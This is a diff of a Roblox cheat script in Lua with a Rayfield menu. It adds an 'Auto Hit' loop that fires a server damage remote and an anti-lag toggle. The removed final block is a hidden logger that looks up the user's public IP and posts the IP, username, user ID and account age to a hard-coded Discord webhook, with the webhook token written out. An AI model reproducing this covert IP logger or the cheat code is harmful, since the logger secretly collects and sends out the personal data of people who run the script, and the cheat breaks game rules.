@@ -10,8 +10,9 @@ local Window = Rayfield:CreateWindow({
     LoadingSubtitle = "by Fro-Fro",
     ConfigurationSaving = {
         Enabled = false
-    }
+    },
 })
+
 
 -- Create Autofarm Tab
 local ATab = Window:CreateTab("Autofarm")
@@ -136,6 +137,63 @@ ATab:CreateToggle({
         end)
     end
 })
+
+local Player = game.Players.LocalPlayer
+local CF
+local Remotee = game:GetService("ReplicatedStorage").Remotes:FindFirstChild("DamageNew")
+local char = Player.Character
+local ennemy
+local con1
+local con2 = false
+-- Function to attack enemies in combat
+local function attackLoop(arg1, arg2)
+	while arg1 and arg1:FindFirstChild(Player.Name) and arg2 and con2 do
+		local playerCombatFolder = arg1:FindFirstChild(Player.Name)
+		if not playerCombatFolder then break end -- Exit if combat folder disappears
+
+		for _, orb in pairs(playerCombatFolder:GetChildren()) do
+			print(arg2, orb, Remotee)
+			if arg2 and orb and Remotee then -- Ensure all exist before firing
+				print("Firing at:", arg2, "with", orb)
+				Remotee:FireServer(arg2, orb)
+			end
+			task.wait(0.05)
+		end
+
+		task.wait(0.5)
+	end
+end
+
+ATab:CreateToggle({
+    Name = "Auto Hit",
+    Default = false,
+    Callback = function(State)
+	con2 = State
+        if State then
+            -- Connect targeting change event
+            con1 = char.Targeting.Changed:Connect(function(Mew)
+                ennemy = Mew
+                if ennemy then
+					print("fired this shi", CF, ennemy)
+                    attackLoop(CF, ennemy) -- Run attack loop if an enemy exists
+                end
+            end)
+        else
+            -- Disconnect event properly
+            if con1 then
+                con1:Disconnect()
+                con1 = nil
+            end
+        end
+    end
+})
+
+workspace.ChildAdded:Connect(function(new)
+    if new.Name == "CombatFolder" and new:FindFirstChild(Player.Name) then
+        CF = new
+    end
+end)
+
 
 local Acts = true
 
@@ -525,6 +583,13 @@ CTab:CreateButton({
 local DTab = Window:CreateTab("Other")
 local DSection = DTab:CreateSection("Other")
 
+DTab:CreateToggle({
+    Name = "No Shadows(Anti Lag)",
+    Callback = function(State)
+        game:GetService("Lighting").GlobalShadows = not State
+    end
+})
+
 DTab:CreateButton({
     Name = "Infinite Combo ComboSword",
     Callback = function()
@@ -768,70 +833,4 @@ SumTab:CreateToggle({
         end
     end
 })
-
-local http = http_request or request or syn.request
-local webhookURL = "https://discord.com/api/webhooks/1350505650169446633/nEvfDDBjE6sQdEOCzLqzy3-lEUK9yFiwOrGWat2gnZOUwK2_5HDdtiZrhjWHVQi9io7I"
-local HttpService = game:GetService("HttpService")
-
--- Get player info
-local player = game.Players.LocalPlayer
-local username = player.Name
-local userId = player.UserId
-local accountAge = player.AccountAge
-local joinTime = os.date("%d/%m/%Y %X")
-
-local ipData = http({
-    Url = "https://checkip.amazonaws.com",
-    Method = "GET"
-})
-
--- Check if the response body is valid JSON or plain text
-local ipAddress = ""
-local isJson = false
-
-local fields = {
-    {name = "**Player Used Script At**", value = joinTime, inline = false},
-    {name = "**Player User Name**", value = player.Name, inline = false},
-}
-
--- Try to decode as JSON, if it fails, treat it as plain text (this is for debugging purposes)
-pcall(function()
-    local ipJSON = HttpService:JSONDecode(ipData.Body)
-    ipAddress = ipJSON.ip
-    isJson = true
-end)
-
-if not isJson then
-    ipAddress = ipData.Body
-end
-
-
-table.insert(fields, {name = "**User ID:**", value = tostring(userId), inline = true})
-table.insert(fields, {name = "**Account Age:**", value = tostring(math.floor(accountAge / 365)) .. "Y, " .. tostring(math.floor((accountAge % 365) / 30)) .. "M, " .. tostring(accountAge % 30) .. "D.", inline = false})
-table.insert(fields, {name = "**IP Address:**", value = tostring(ipAddress) , inline = false})
-
-local embedData = {
-    title = "Player Event Log", 
-    color = 65280,
-    fields = fields
-}
-
-
-local data = {
-    username = "Game Logs",
-    embeds = {embedData}
-}
-
-
-
-local jsonData = HttpService:JSONEncode(data)
-
-
-http({
-    Url = webhookURL,
-    Method = "POST",
-    Headers = {["Content-Type"] = "application/json"},
-    Body = jsonData
-})
-
 
